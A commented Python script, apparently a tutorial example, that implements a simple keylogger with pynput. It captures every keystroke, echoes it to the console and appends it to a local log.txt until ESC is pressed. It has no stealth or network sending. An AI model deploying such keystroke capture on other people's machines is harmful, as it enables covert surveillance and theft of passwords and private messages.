# Import the Key and Listener classes from the pynput.keyboard module
# Key lets us refer to special keys (like ESC), and Listener allows us to monitor keyboard events
import os
print("Saving log file to:", os.getcwd())
from pynput.keyboard import Key, Listener

# Global variables to keep track of pressed keys
count = 0          # Keeps count of how many keys have been pressed
keys = []          # Stores the keys pressed so far

# ------------------------------------------------------------
# Function called whenever a key is pressed
# ------------------------------------------------------------
def on_press(key):
    global keys, count                # Allows modification of the global variables
    keys.append(key)                  # Add the pressed key to the list
    count += 1                        # Increment the key press counter
    print(f"{key} pressed")           # Print which key was pressed to the console

    # Every 10 keys pressed, write them to the log file and reset the list
    if count >= 10:
        count = 0
        write_file(keys)              # Call the function to write keys to a file
        keys = []                     # Reset the list to start collecting new keys

# ------------------------------------------------------------
# Function to write the captured keys to a file
# ------------------------------------------------------------
def write_file(keys):
    # Open (or create) a file called "log.txt" in append mode
    # This means it adds new content without deleting existing logs
    with open("log.txt", "a") as f:
        for key in keys:
            # Convert key object to string and remove quotes (e.g., 'a' -> a)
            k = str(key).replace("'", "")
            # Handle special keys like space or enter more cleanly
            if k.find("space") > 0:
                f.write(" ")
            elif k.find("enter") > 0:
                f.write("\n")
            elif k.find("Key") == -1:  # Ignore non-character keys like shift or ctrl
                f.write(k)

# ------------------------------------------------------------
# Function called when a key is released
# ------------------------------------------------------------
def on_release(key):
    # If the user presses the ESC key, stop the listener
    if key == Key.esc:
        return False

# ------------------------------------------------------------
# Start the keyboard listener
# ------------------------------------------------------------
# Listener runs continuously and calls on_press/on_release as events occur
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()  # Keeps the program running until ESC is pressed

